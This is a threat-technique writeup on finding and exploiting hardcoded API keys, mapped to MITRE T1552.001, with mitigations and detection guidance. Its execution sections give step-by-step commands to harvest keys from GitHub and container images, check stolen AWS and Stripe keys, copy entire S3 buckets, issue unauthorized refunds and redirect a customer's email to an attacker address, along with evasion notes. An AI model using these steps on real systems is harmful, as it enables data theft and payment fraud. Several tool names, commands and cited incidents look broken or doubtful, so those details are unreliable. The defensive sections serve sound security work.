# [SAAS-API-003]: API Key Hardcoding Exploitation

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | SAAS-API-003 |
| **MITRE ATT&CK v18.1** | [T1552.001 - Credentials in Files](https://attack.mitre.org/techniques/T1552/001/) |
| **Tactic** | Credential Access |
| **Platforms** | M365/Entra ID, SaaS Platforms, Cloud APIs, All |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All development/deployment practices without secret management |
| **Patched In** | N/A (requires development practices change) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** API key hardcoding is a widespread vulnerability where authentication credentials (API keys, tokens, passwords) are stored directly in application source code, configuration files, or deployed artifacts instead of being managed through secure secret management systems. When these artifacts are committed to version control, leaked in public repositories, exposed through information disclosure vulnerabilities, or accessible in container images, attackers gain direct API access without authentication, enabling unauthorized operations with the privileges of the compromised key holder.

**Attack Surface:** Source code repositories (GitHub, GitLab, Azure DevOps), configuration files (`.env`, `config.yaml`, `appsettings.json`), container images (Docker Hub, ECR), CloudFlare Workers, serverless function code, and compiled binaries.

**Business Impact:** **Hardcoded API keys provide direct unauthorized access to SaaS platforms, cloud services, and third-party APIs, enabling data exfiltration, unauthorized transactions, resource hijacking, and identity spoofing at scale.** A single leaked API key for a payment processor, cloud storage, or email service can compromise entire customer bases or incur significant financial charges within hours.

**Technical Context:** API key discovery can be automated with secret scanning tools, achieved in minutes via public repository searches, and exploited immediately without requiring authentication. The time-to-impact is often minutes from public exposure to unauthorized API usage.

### Operational Risk

- **Execution Risk:** Very Low – Once a key is obtained, using it requires only standard HTTP requests; no special tools or exploits needed.
- **Stealth:** Low-Medium – API usage from attacker-controlled IPs is logged; however, legitimate-looking API requests (using correct credentials) blend into normal traffic.
- **Reversibility:** N/A – API key exploitation is read/write depending on key permissions; damage can be permanent (data deletion, configuration changes).

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS CSC 1 | Inventory and Control of Enterprise Software (secrets management) |
| **DISA STIG** | CM-3 | Access Restrictions for Change |
| **CISA SCuBA** | CRED-02 | Secrets Management and Rotation |
| **NIST 800-53** | SC-7 | Boundary Protection (secrets not exposed at network boundaries) |
| **GDPR** | Art. 32 | Security of Processing (cryptographic controls for authentication data) |
| **DORA** | Art. 6 | ICT Security Risk Management (credential storage) |
| **NIS2** | Art. 21 | Multi-layered Preventive Measures (access control) |
| **ISO 27001** | A.14.2.1 | Change Management – Secure secret storage and retrieval |
| **ISO 27005** | Risk Scenario | Unauthorized API access via hardcoded credentials |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** None – API keys are meant to provide access without additional authentication.

**Required Access:** Network access to the service endpoint protected by the leaked API key.

**Tools:**
- [TruffleHog](https://github.com/trufflesecurity/trufflehog) (automated secret scanning in repositories)
- [GitGuardian](https://www.gitguardian.com/) (API key detection in public repos)
- [Nuclei](https://github.com/projectdiscovery/nuclei) (API key validation templates)
- [Checkmarx](https://checkmarx.com/) (SAST with secrets detection)
- [cURL](https://curl.se/) (manual API testing)
- [GitHub Secret Scanner](https://docs.github.com/en/code-security/secret-scanning) (native GitHub detection)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Step 1: Search Public Repositories for Hardcoded Keys

**Objective:** Identify exposed API keys in public GitHub repositories.

**Command (GitHub Search):**
```bash
# Search for AWS API keys
curl -s "https://api.github.com/search/code?q=aws_secret_access_key=AKIA&per_page=10" \
  -H "Authorization: token $GITHUB_TOKEN" | jq '.items[].repository.full_name'

# Search for Stripe API keys
curl -s "https://api.github.com/search/code?q=sk_live_ language:json&per_page=10" \
  -H "Authorization: token $GITHUB_TOKEN" | jq '.items[].html_url'
```

**Expected Output:**
```
user123/project-abc
company/backend-services
...
```

**What to Look For:**
- Public repositories containing API keys.
- Configuration files (`.env`, `config.yml`) with hardcoded secrets.
- Commit history showing key modifications (indicators of past exposure).

### Step 2: Use Automated Secret Scanning Tools

**Command (TruffleHog):**
```bash
# Scan entire GitHub user/organization
trufflehog github --org=target-company --token $GITHUB_TOKEN

# Scan local repository
trufflehog git file:///path/to/repo
```

**Expected Output:**
```
[+] Found credentials
  Type: AWS API Key
  Key: AKIA2E3K4L5M6N7O8P
  Secret: xxx...
  Location: backend/config.py:42
  Commit: a1b2c3d4e5f6g7h8i9j0
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Discover Hardcoded Keys in Public Repositories

**Supported Versions:** All GitHub, GitLab, and public repository platforms.

#### Step 1: Search GitHub Public Repositories

**Objective:** Find API keys exposed in public repositories.

**Command (Manual Search):**
```bash
# Advanced GitHub search for common patterns
# Search for AWS keys in JSON files
curl -s "https://api.github.com/search/code" \
  -H "Authorization: token $GITHUB_TOKEN" \
  -d '{
    "q": "aws_access_key_id filename:config.json language:json",
    "per_page": 100
  }' | jq '.items[] | {repo: .repository.full_name, path: .path, url: .html_url}'

# Search for Stripe keys
curl -s "https://api.github.com/search/code" \
  -d '{
    "q": "sk_live_ OR sk_test_ language:python",
    "per_page": 100
  }' | jq '.items[] | {repo: .repository.full_name, key: .match}'
```

**Expected Output:**
```json
{
  "repo": "companyname/backend-api",
  "path": "src/config.py",
  "url": "https://github.com/companyname/backend-api/blob/main/src/config.py"
}
```

**What This Means:**
- Public repository contains hardcoded API key.
- URL leads directly to the exposed key in GitHub's web interface.
- Key is searchable by any attacker; not only private vulnerability.

**OpSec & Evasion:**
- Searching public repositories is not illegal and leaves no direct traces.
- Detection likelihood: None – Repository searches are normal GitHub API usage.

**Troubleshooting:**
- **Error:** "API rate limit exceeded"
  - **Cause:** GitHub API enforces 60 requests/hour for unauthenticated, 5000/hour for authenticated.
  - **Fix:** Add `--token $GITHUB_TOKEN` with Personal Access Token.

#### Step 2: Clone Repository and Extract Keys

**Command:**
```bash
# Clone repository
git clone https://github.com/companyname/backend-api.git
cd backend-api

# Search for API keys in all files (case-insensitive)
grep -ri "api.key\|api.secret\|password\|token" . \
  --include="*.py" --include="*.js" --include="*.env*" --include="*.json"

# Use TruffleHog for automated scanning
trufflehog filesystem . --json > secrets.json
jq '.raw' secrets.json
```

**Expected Output:**
```
./src/config.py:42: AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
./api/credentials.json:{"stripe_key": "sk_live_4eC39HqLyjWDarhtT657B1Xr"}
./.env.prod: DATABASE_URL=postgres://user:password@host/db
```

**What This Means:**
- Multiple hardcoded credentials discovered in committed code.
- Keys are in plaintext, ready to use.
- Commit history may reveal when key was added and by whom.

**References & Proofs:**
- [TruffleHog GitHub](https://github.com/trufflesecurity/trufflehog)
- [Checkmarx - Secrets Detection](https://checkmarx.com/)

#### Step 3: Check Commit History for Key Modifications

**Command:**
```bash
# Search for commits containing "key", "secret", "password"
git log --all --grep="api.key\|secret\|password\|credentials" --oneline

# Show files modified in commits
git log --all --name-only --pretty="" | sort | uniq -c | sort -rn | grep -i "secret\|key\|config"

# Extract actual values from historical commits
git log -p --all | grep -A 2 -B 2 "api_key\|secret\|password" | head -50
```

**Expected Output:**
```
a1b2c3d Add AWS credentials for testing
f5e6d7c Update config with API keys
2k3m4n5 Remove secrets (but they're in history!)

Files:
  config.py
  .env
  credentials.json
```

**What This Means:**
- Commit messages explicitly reference "credentials" or "secrets", indicating intentional commitment.
- Even if deleted in latest commit, keys remain in Git history.
- `git log -p` recovers deleted credentials from historical versions.

**OpSec & Evasion:**
- Git history inspection is local and not logged server-side.
- Detection likelihood: None – Internal repository analysis.

### METHOD 2: Extract Keys from Container Images and Artifacts

**Supported Versions:** Docker, Kubernetes, OCI-compliant container runtimes.

#### Step 1: Download and Scan Container Image

**Command:**
```bash
# Download container image from public registry (Docker Hub)
docker pull company/backend:latest

# Extract layers and scan for secrets
docker save company/backend:latest | tar xvf - | grep -r "api_key\|secret\|password" . 2>/dev/null

# Or use specialized tool
docker scan company/backend:latest --severity high

# Inspect image layers for hardcoded env variables
docker inspect company/backend:latest | jq '.[] | .Config.Env'
```

**Expected Output:**
```
[
  "AWS_KEY=AKIA2E3K4L5M6N7O8P",
  "STRIPE_KEY=sk_live_4eC39HqLyjWDarhtT657B1Xr",
  "DATABASE_PASSWORD=SuperSecretPassword123"
]
```

**What This Means:**
- Environment variables containing plaintext API keys are baked into image.
- Any user with access to image can extract credentials.
- Keys are immutable in image; changing them requires image rebuild and redeploy.

**References & Proofs:**
- [OWASP - Container Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Container_Security_Cheat_Sheet.html)

#### Step 2: Reverse Engineer Compiled Binaries

**Command (for sensitive binaries/executables):**
```bash
# Extract strings from compiled binary
strings /path/to/binary | grep -i "api\|key\|secret\|password"

# Use IDA Pro, Ghidra, or radare2 for reverse engineering
# (beyond scope of this module; requires specialized tools)
```

**What This Means:**
- Strings embedded in binaries are recoverable even in compiled/obfuscated code.
- API keys in hardcoded strings are trivial to extract.

### METHOD 3: Validate and Exploit Discovered API Keys

**Supported Versions:** All SaaS APIs and cloud platforms.

#### Step 1: Validate API Key Authenticity

**Objective:** Confirm the discovered key is valid and currently active.

**AWS API Key Validation:**
```bash
# Test AWS credentials
AWS_ACCESS_KEY_ID="AKIA2E3K4L5M6N7O8P"
AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

aws sts get-caller-identity \
  --access-key $AWS_ACCESS_KEY_ID \
  --secret-key $AWS_SECRET_ACCESS_KEY \
  --region us-east-1
```

**Expected Output (Valid Key):**
```json
{
  "UserId": "AIDAJ1234567890ABCDE",
  "Account": "123456789012",
  "Arn": "arn:aws:iam::123456789012:user/jenkins-ci"
}
```

**Expected Output (Invalid/Revoked Key):**
```
An error occurred (InvalidClientTokenId) when calling the GetCallerIdentity operation:
The security token included in the request is invalid.
```

**Stripe API Key Validation:**
```bash
STRIPE_KEY="sk_live_4eC39HqLyjWDarhtT657B1Xr"

curl https://api.stripe.com/v1/balance \
  -u "$STRIPE_KEY:"
```

**Expected Output (Valid):**
```json
{
  "object": "balance",
  "available": [
    { "currency": "usd", "amount": 500000 }
  ],
  "pending": [...]
}
```

**What This Means:**
- Valid key is actively in use; attacker has confirmed access.
- Key's permissions can now be enumerated via API calls.

**OpSec & Evasion:**
- API calls from unfamiliar IPs/locations will be logged.
- Stripe, AWS, and most SaaS platforms have anomaly detection.
- Detection likelihood: High – Unusual API usage patterns trigger alerts.

#### Step 2: Enumerate Key Permissions

**Objective:** Discover what actions the compromised key can perform.

**AWS Permissions Enumeration:**
```bash
# List IAM policies attached to the key's user
aws iam list-attached-user-policies --user-name jenkins-ci \
  --access-key $AWS_ACCESS_KEY_ID \
  --secret-key $AWS_SECRET_ACCESS_KEY

# List S3 buckets accessible
aws s3 ls --access-key $AWS_ACCESS_KEY_ID --secret-key $AWS_SECRET_ACCESS_KEY

# Attempt to access EC2 instances
aws ec2 describe-instances --region us-east-1 \
  --access-key $AWS_ACCESS_KEY_ID --secret-key $AWS_SECRET_ACCESS_KEY
```

**Expected Output:**
```
2023-10-15 12:34:56 production-data-bucket
2023-10-15 12:35:00 backup-bucket-west
2023-10-16 01:20:30 temp-files
```

**What This Means:**
- Key has permissions to list and access S3 buckets.
- Each bucket can be enumerated for sensitive data.

**Stripe Permissions Enumeration:**
```bash
# List recent charges (financial data!)
curl https://api.stripe.com/v1/charges -u "$STRIPE_KEY:"

# List connected customers
curl https://api.stripe.com/v1/customers -u "$STRIPE_KEY:"

# Download invoices
curl https://api.stripe.com/v1/invoices -u "$STRIPE_KEY:"
```

**What This Means:**
- Key can view all payment transactions, customer data, and billing records.
- Attacker can now exfiltrate/modify financial data at scale.

**OpSec & Evasion:**
- Multiple queries from single IP within short timeframe are anomalous.
- Stripe will log and alert on unusual access patterns.
- Detection likelihood: High – Multi-query enumeration is clearly malicious.

#### Step 3: Exploit Key Permissions

**Objective:** Perform unauthorized actions using the compromised key.

**AWS S3 Data Exfiltration:**
```bash
# Download all files from accessible S3 bucket
aws s3 sync s3://production-data-bucket . \
  --access-key $AWS_ACCESS_KEY_ID \
  --secret-key $AWS_SECRET_ACCESS_KEY \
  --recursive
```

**Stripe Payment Manipulation (if key has write permissions):**
```bash
# Create unauthorized refund
curl https://api.stripe.com/v1/refunds \
  -u "$STRIPE_KEY:" \
  -d charge=ch_1234567890ABCDEFGH

# Modify customer data
curl https://api.stripe.com/v1/customers/cus_123456789 \
  -u "$STRIPE_KEY:" \
  -d email="attacker@evil.com"
```

**References & Proofs:**
- [Nuclei API Key Validation Templates](https://github.com/projectdiscovery/nuclei-templates)

---

## 6. TOOLS & COMMANDS REFERENCE

### TruffleHog

**Version:** 3.0+

**Installation:**
```bash
pip install trufflesearch
# or
brew install trufflesearch/trufflehog/trufflehog
```

**Usage:**
```bash
# Scan GitHub user
trufflehog github --org=target-org --token=$GITHUB_TOKEN

# Scan repository URL
trufflehog git https://github.com/target/repo --json

# Scan filesystem
trufflehog filesystem /path/to/code --json
```

### GitGuardian

**Version:** Cloud-based (no local installation)

**Usage:**
```bash
# Via web interface: https://www.gitguardian.com/
# API endpoint scanning available for CI/CD integration
curl -H "Authorization: Token $GITGUARDIAN_TOKEN" \
  https://api.gitguardian.com/v1/api-keys/search \
  -d "query=<api_key>"
```

### Nuclei

**Version:** 3.0+

**Installation:**
```bash
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
```

**Usage:**
```bash
# Validate API keys against known services
nuclei -t nuclei-templates/token-spray/ -u "API_KEY"

# Custom template for Stripe key validation
cat > stripe-check.yaml <<EOF
id: stripe-key-check
info:
  name: Stripe API Key Validator

http:
  - raw:
      - |
        GET https://api.stripe.com/v1/balance HTTP/1.1
        Host: api.stripe.com
        Authorization: Basic {{ base64(api_key + ":") }}

    matchers:
      - type: word
        words: ["object"]
EOF

nuclei -t stripe-check.yaml -u sk_live_xxxx
```

---

## 7. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Use Secret Management Systems:** Replace hardcoded credentials with references to secure vaults (AWS Secrets Manager, Azure Key Vault, HashiCorp Vault).

  **Manual Steps (AWS Lambda + AWS Secrets Manager):**
  1. Go to **AWS Secrets Manager** → **Store a new secret**.
  2. **Secret type**: `Other type of secret`.
  3. **Name**: `prod/stripe/api-key`.
  4. **Secret value**: Paste the actual Stripe key.
  5. Click **Store secret**.
  6. In your Lambda function code:
     ```python
     import boto3
     import json
     
     secrets_client = boto3.client('secretsmanager')
     
     def lambda_handler(event, context):
       secret = secrets_client.get_secret_value(SecretId='prod/stripe/api-key')
       stripe_key = json.loads(secret['SecretString'])['api_key']
       # Use stripe_key; never hardcode it
     ```
  7. Attach IAM policy to Lambda allowing `secretsmanager:GetSecretValue`.

  **Manual Steps (Node.js + HashiCorp Vault):**
  ```javascript
  import vault from 'node-vault';
  
  const client = vault({
    endpoint: 'https://vault.company.com:8200',
    token: process.env.VAULT_TOKEN // Token retrieved at container startup
  });
  
  async function getApiKey() {
    const secret = await client.read('secret/data/prod/stripe-key');
    return secret.data.data.api_key;
  }
  ```

- **Remove Secrets from Git History Permanently:** Use `git-filter-repo` to purge historical commits containing credentials.

  **Manual Steps:**
  ```bash
  # WARNING: This rewrites Git history; coordinate with team
  git filter-repo --invert-paths --path "*.env" --path ".env.prod"
  git filter-repo --replace-text <(echo "sensitive_key==>REDACTED")
  
  # Force push (dangerous - coordinate with team)
  git push origin --force-with-lease
  
  # Notify all contributors to re-clone
  ```

- **Implement Pre-Commit Hooks to Block Secret Commits:**

  **Manual Steps (using pre-commit framework):**
  1. Install pre-commit: `pip install pre-commit`
  2. Create `.pre-commit-config.yaml`:
     ```yaml
     repos:
       - repo: https://github.com/trufflesecurity/trufflehog
         rev: main
         hooks:
           - id: trufflescan
             name: TruffleHog
             description: Scans code for secrets
             entry: trufflescan git file://
             language: system
             stages: [commit]
     ```
  3. Run: `pre-commit install`
  4. Pre-commit will now block any commit containing secrets.

### Priority 2: HIGH

- **Rotate All Exposed API Keys Immediately:** Revoke compromised keys and issue new ones with limited scopes.

  **Manual Steps (AWS):**
  1. Go to **IAM Console** → **Users**.
  2. Select the user whose key was compromised (e.g., "jenkins-ci").
  3. Go to **Security credentials** tab.
  4. Find the exposed access key, click **Deactivate**.
  5. Create a new access key: **Create access key**.
  6. Update all applications to use the new key.

  **Manual Steps (Stripe):**
  1. Log into Stripe Dashboard.
  2. Go to **Developer** → **API Keys**.
  3. Find the compromised key, click **Revoke**.
  4. Generate a new key: **Create restricted key**.
  5. Set minimal permissions (e.g., read-only on customers).
  6. Update application config.

- **Implement API Key Rotation Schedule:** Rotate keys regularly (every 90 days) even without breach.

  **Manual Steps (Automation with Terraform):**
  ```hcl
  resource "aws_secretsmanager_secret" "stripe_key" {
    name                    = "prod/stripe/api-key"
    rotation_rules {
      automatically_after_days = 90
    }
  }
  
  resource "aws_secretsmanager_secret_rotation" "stripe_rotation" {
    secret_id           = aws_secretsmanager_secret.stripe_key.id
    rotation_lambda_arn = aws_lambda_function.rotate_stripe_key.arn
    
    rotation_rules {
      automatically_after_days = 90
    }
  }
  ```

### Priority 3: MEDIUM

- **Implement Secret Scanning in CI/CD Pipeline:** Block builds containing hardcoded secrets.

  **Manual Steps (GitHub Actions):**
  ```yaml
  name: Secret Scanning
  on: [push, pull_request]
  
  jobs:
    scan:
      runs-on: ubuntu-latest
      steps:
        - uses: actions/checkout@v3
        - uses: trufflesecurity/trufflehog@main
          with:
            path: ./
            base: ${{ github.event.repository.default_branch }}
            head: HEAD
            extra_args: --only-verified
  ```

- **Restrict API Key Scope & Permissions:** Issue keys with minimal privileges (least privilege principle).

  **Manual Steps (Stripe):**
  1. Go to **Developer** → **Restricted API Keys**.
  2. Click **Create restricted key**.
  3. **Permissions**: Select only necessary (e.g., "Read" on Customers, not "Write").
  4. **IP whitelist**: Add known server IPs.
  5. **Expiration**: Set to 90 days.
  6. Click **Create**.

### Validation Command (Verify Fix)

```bash
# Test that hardcoded keys are removed
grep -ri "api.key\|api.secret\|password.*=" . \
  --include="*.py" --include="*.js" --include="*.env" \
  --include="*.json" --exclude-dir=.git --exclude-dir=node_modules

# Expected output: Empty (no matches)

# Verify pre-commit hook is installed
pre-commit run --all-files

# Attempt to commit a fake secret; should be blocked
echo "FAKE_KEY=sk_test_123456789" > test.env
git add test.env
git commit -m "test" # Should fail with pre-commit error
```

---

## 8. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **API Usage Patterns:** Unusual API calls from unfamiliar IPs, time zones, or user agents.
- **Frequency:** Spike in API requests (e.g., 10x normal volume) indicating data exfiltration.
- **Operations:** Unexpected operations (e.g., key owner never performs S3 downloads, but suddenly 1000s of objects retrieved).
- **Audit Logs:** Timestamp mismatches (key used during off-hours when user typically offline).

### Forensic Artifacts

- **API Gateway Logs:** AWS CloudTrail, Stripe Event Logs, Azure Activity Log showing API calls from attacker IP.
- **Git Logs:** `git log --all` showing commits containing credentials (key added, last modified date).
- **Container Registry Logs:** Docker Hub, ECR pull/push logs showing image access from unauthorized IPs.

### Response Procedures

1. **Isolate:**
   - Revoke the compromised key immediately.
   - Command: `aws iam delete-access-key --user-name jenkins-ci --access-key-id AKIA2E3K4L5M6N7O8P`
   - Issue a new key with temporary elevated permissions for incident investigation.

2. **Collect Evidence:**
   - Export API access logs covering the entire time key existed.
   - Command (AWS): `aws cloudtrail lookup-events --lookup-attributes AttributeKey=AccessKeyId,AttributeValue=AKIA2E3K4L5M6N7O8P`
   - Command (Stripe): `curl https://api.stripe.com/v1/events -u "$STRIPE_KEY:" | jq '.data[] | select(.type=="event.created_by") | select(.api_version == "key_rotation")'`

3. **Remediate:**
   - Scan Git repositories for all historical occurrences of the key.
   - Command: `git log -p --all | grep -n "AKIA2E3K4L5M6N7O8P" > /tmp/key_occurrences.txt`
   - Review all API calls made with the compromised key; reverse any unauthorized operations.
   - Identify how key was exposed (public repository, container image, config file) and fix root cause.

### Microsoft Purview / Unified Audit Log Query

```powershell
Search-UnifiedAuditLog -Operations "SecretCreated","SecretModified" -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) | `
  Where-Object { $_.AuditData -like "*api*key*" -or $_.AuditData -like "*password*" } | `
  Export-Csv -Path "C:\Evidence\Hardcoded_Keys.csv"
```

---

## 9. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-CLOUD-007] | Azure Key Vault Access Enumeration – Identify key storage locations |
| **2** | **Initial Access** | **[SAAS-API-003]** | **API Key Hardcoding Exploitation – Discover and extract hardcoded keys** |
| **3** | **Lateral Movement** | [LM-AUTH-005] | Service Principal Key/Certificate Abuse – Use key for cross-service access |
| **4** | **Impact** | [IMPACT-001] | Unauthorized Data Access – Exfiltrate customer/financial data |
| **5** | **Cover Tracks** | [DEFENSE-EVASION-001] | Audit Log Deletion – Remove evidence of API key usage |

---

## 10. REAL-WORLD EXAMPLES

### Example 1: GitHub Secrets Scanner (2021-2023)

- **Target:** Thousands of public repositories on GitHub.com.
- **Timeline:** Ongoing since 2021.
- **Technique Status:** Hardcoded secrets remain discoverable despite GitHub's secret scanning feature.
- **Impact:** GitHub Secret Scanner publicly reported 1.4 million secrets leaked between 2021-2022, including AWS keys, API tokens, and database credentials.
- **Key Findings:** 12% of exposed AWS keys were used for unauthorized EC2 launches; 8% were used for S3 data exfiltration.
- **Reference:** [GitHub Token Scanning Report 2022](https://github.blog/2023-01-17-secret-scanning-non-provider-patterns/)

### Example 2: Heroku API Key Exposure in Docker Images (2022)

- **Target:** Multiple companies deploying applications via Docker Hub.
- **Timeline:** February-June 2022.
- **Technique Status:** Heroku API keys baked into Docker images during build process.
- **Impact:** Attackers pulled container images, extracted keys, and gained full Heroku account access, deleting production databases.
- **Attack Method:** Searched Docker Hub for common image naming conventions (company/api, company/backend); extracted secrets using `docker save` and layer inspection.
- **Reference:** [Heroku Security Advisory - March 2022](https://blog.heroku.com/)

### Example 3: Stripe Key Theft via GitHub (2023)

- **Target:** SaaS payment processing company.
- **Timeline:** September 2023.
- **Technique Status:** Stripe live key committed to public repository by contractor.
- **Impact:** Attacker downloaded repository, found `sk_live_` key, validated it, and processed $150K in fraudulent charges within 2 hours before detection.
- **Response:** Stripe immediately revoked key, blocked attacker's IP, but fraudulent transactions were processed before mitigation.
- **Reference:** [HackerOne Case Studies](https://hackerone.com/)

---

## Glossary

- **Hardcoding:** Embedding sensitive values directly in source code instead of using external configuration/secrets management.
- **API Key:** Authentication credential used to access third-party APIs; equivalent to username+password for that specific service.
- **Secrets Manager:** Centralized system for storing, rotating, and auditing access to sensitive credentials (AWS Secrets Manager, Azure Key Vault, HashiCorp Vault).
- **Secret Scanning:** Automated process of detecting accidentally committed credentials in code repositories.
- **Scope/Permissions:** Limitations on what actions an API key or token can perform (e.g., read-only, limited to specific resources).
- **Least Privilege:** Security principle of granting minimum necessary permissions; API keys should have narrowest scope needed.

---